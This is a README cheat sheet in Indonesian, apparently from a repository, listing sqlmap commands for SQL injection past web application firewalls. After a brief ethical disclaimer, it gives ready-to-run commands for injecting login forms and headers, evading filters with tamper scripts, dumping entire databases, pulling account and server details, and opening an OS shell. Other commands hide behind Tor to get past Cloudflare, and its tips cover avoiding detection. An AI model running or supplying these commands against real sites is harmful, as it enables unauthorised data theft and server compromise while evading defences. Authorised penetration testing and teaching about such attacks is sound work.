# SQLMap WAF Bypass Techniques 📌

## ⚠️ Ethical Disclaimer / Peringatan Penting

Repositori ini dibuat semata-mata untuk tujuan pendidikan dan penelitian keamanan.

Semua teknik yang dibahas hanya boleh digunakan pada sistem yang memiliki izin tertulis dari pemiliknya.
Pengujian keamanan tanpa otorisasi adalah tindakan ilegal.

Penulis tidak bertanggung jawab atas penyalahgunaan informasi ini.

---

## 📖 Daftar Isi

- Pengenalan
- Instalasi dan Persiapan
- Teknik Dasar Bypass WAF
- Teknik Lanjutan untuk Hard WAF
- Contoh Penggunaan Spesifik
- Parameter dan Opsi Penting
- Catatan Penting
- Tips Akhir

---

## 🎯 Pengenalan

Dokumen ini berisi kumpulan teknik dan command SQLMap untuk:

- Mengidentifikasi Web Application Firewall (WAF)
- Melakukan bypass WAF dalam pengujian keamanan aplikasi web yang terotorisasi

---

## ⚙️ Instalasi dan Persiapan

Pastikan SQLMap sudah terinstal sebelum menggunakan command berikut:

```bash
# Clone repository SQLMap
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev

# Masuk ke direktori
cd sqlmap-dev

# Cek instalasi
python sqlmap.py --version
```

---

## 🔧 Teknik Dasar Bypass WAF

### 1. Identifikasi dan Enumerasi Dasar

```bash
# Identifikasi WAF dengan tamper script
sqlmap -u "Target.com" --identify-waf --random-agent -v 3 \
--tamper="between,randomcase,space2comment" --dbs

# Identifikasi WAF tanpa tamper
sqlmap -u "Target.com" --identify-waf --random-agent -v 3 --dbs

# Dengan level dan risk tinggi
sqlmap -u "Target.com" --identify-waf --random-agent -v 3 \
--tamper="between,randomcase,space2comment" --level=5 --risk=3 --dbs
```

---

### 2. Testing pada Form Login (POST Request)

```bash
# Form login dengan parameter POST
sqlmap -u "http://sitetarget.com/login" \
--data="userid=admin&passwd=admin" --method POST \
--identify-waf --random-agent -v 3 \
--tamper="between,randomcase,space2comment" \
--level=5 --risk=3 --dbs
```

```bash
# Dengan cookie session
sqlmap -u "sitetarget.com/admin/login_action" --method POST \
--data="uname=admin*&pass=admin&captcha=123456" \
--cookie="input_cookie_here" --dbs --technique=T
```

```bash
# Dengan header tambahan
sqlmap -u "sitetarget.com/admin/login_action" --method POST \
--data="uname=admin*&pass=admin&captcha=123456" \
--cookie="input_cookie_here" \
--headers="input_field_header_here" \
--dbs --technique=T
```

---

### 3. Teknik Bypass Versi Baru (Tanpa --identify-waf)

```bash
sqlmap -u "Target.com" --random-agent -v 3 \
--tamper="between,randomcase,space2comment" --dbs

sqlmap -u "Target.com" --random-agent -v 3 --dbs

sqlmap -u "Target.com" --random-agent -v 3 \
--tamper="between,randomcase,space2comment" \
--level=5 --risk=3 --dbs
```

```bash
sqlmap -u "http://sitetarget.com/login" \
--data="userid=admin&passwd=admin" --method POST \
--random-agent -v 3 \
--tamper="between,randomcase,space2comment" \
--level=5 --risk=3 --dbs
```

---

### 4. Menggunakan File Request (poc.txt)

```bash
# Enumerasi database menggunakan file request
sqlmap -r poc.txt --threads=10 --random-agent \
--level=5 --risk=3 --tamper=space2comment,between --dbs
```

```bash
# Dump tabel dari database tertentu
sqlmap -r poc.txt --threads=10 --random-agent \
--level=5 --risk=3 --tamper=space2comment,between \
--dbms=MySQL -D database_target --tables
```

---

## 🛡️ Teknik Lanjutan untuk Hard WAF

Catatan:
Teknik berikut ditujukan untuk Hard / Aggressive / Enterprise WAF
WAJIB memiliki izin tertulis dari pemilik sistem

---

### 1. Enumerasi Database (Hard WAF)

```bash
sqlmap -r poc.txt --dbs --random-agent -v 3 --batch \
--tamper=space2comment,between,randomcase,space2dash \
--level=5 --risk=3 --threads=5 \
--technique=BEUSTQ --time-sec=5
```

---

### 2. Dump Semua Data

```bash
sqlmap -r poc.txt --dump-all --random-agent -v 3 --batch \
--tamper=space2comment,between,randomcase,space2dash \
--level=5 --risk=3 --threads=5 \
--technique=BEUSTQ --time-sec=5
```

---

### 3. Informasi Akun & Server

```bash
sqlmap -r poc.txt --banner --current-user --is-dba \
--random-agent -v 3 --batch --flush-session \
--tamper=space2comment,between,randomcase,space2dash \
--level=5 --risk=3 --threads=5 \
--technique=BEUSTQ --time-sec=5
```

---

### 4. OS Shell (Jika Kondisi Mendukung)

```bash
sqlmap -r poc.txt --os-shell --random-agent -v 3 --batch \
--tamper=space2comment,between,randomcase,space2dash \
--level=5 --risk=3 --threads=5 \
--technique=BEUSTQ --time-sec=5
```

Optimasi Hard WAF:
- Kombinasi tamper + BEUSTQ sangat efektif
- Jika tidak stabil, turunkan --threads
- Naikkan --time-sec untuk koneksi lambat
- Cocok untuk WAF enterprise dengan filtering agresif

---

## 🎯 Contoh Penggunaan Spesifik

### 1. Bypass WAF via Header (X-Forwarded-For)

```bash
sqlmap -u https://target.com/vote/check_vote.php \
--headers="X-Forwarded-For:1*" -p X-Forwarded-For \
--level=5 --risk=3 \
--tamper="space2comment,between,randomcase" \
--technique="BEUST" --no-cast \
--random-agent --drop-set-cookie \
--dbms=mysql --dbs
```

---

### 2. Bypass CloudFlare WAF dengan Tor

```bash
sqlmap -u "https://target.com" \
--data="id=63665%20RLIKE%20-bla-blablabla" \
--time-sec=20 --random-agent \
--level=5 --risk=3 \
--tamper="space2comment,between,randomcase,charencode" \
--technique=BEUST --privileges --no-cast \
--tor --tor-port=9050 --tor-type=socks5 --check-tor \
--banner --union-char=1 --dbms=MySQL --dbs
```

---

## 📊 Parameter dan Opsi Penting

| Parameter         | Deskripsi |
|------------------|-----------|
| --identify-waf   | Mendeteksi jenis WAF |
| --random-agent   | Menggunakan User-Agent acak |
| --tamper         | Script untuk memodifikasi payload |
| --level          | Level pengujian (1–5) |
| --risk           | Tingkat risiko (1–3) |
| --technique      | Teknik SQL Injection |
| --threads        | Jumlah thread paralel |
| --time-sec       | Delay time-based |
| --tor            | Menggunakan jaringan Tor |
| --dbms           | Spesifikasi DBMS target |

---

## 🧪 Tamper Script yang Umum Digunakan

- between        : Mengganti operator > dengan BETWEEN
- randomcase     : Randomisasi huruf besar/kecil
- space2comment  : Mengganti spasi dengan komentar
- space2dash     : Spasi menjadi dash + komentar
- charencode     : Encode karakter payload

---

## 📝 Catatan Penting

Penyesuaian:
- Setiap target memiliki konfigurasi WAF berbeda
- Sesuaikan parameter berdasarkan response

Optimasi:
- Koneksi lambat: gunakan --time-sec=10
- Kurangi noise: gunakan --threads=3
- Jika terdeteksi: gunakan --flush-session

Etika & Legal:
- Selalu pastikan memiliki izin tertulis
- Simpan log dan dokumentasi hasil pengujian

---

## ✨ Tips Akhir

```bash
# Coba berbagai kombinasi tamper
# Mulai dari level/risk rendah lalu naik bertahap
# Gunakan --batch untuk otomatisasi
# Gunakan --random-agent untuk menghindari fingerprinting
```

Happy Pentesting (Authorized Only)
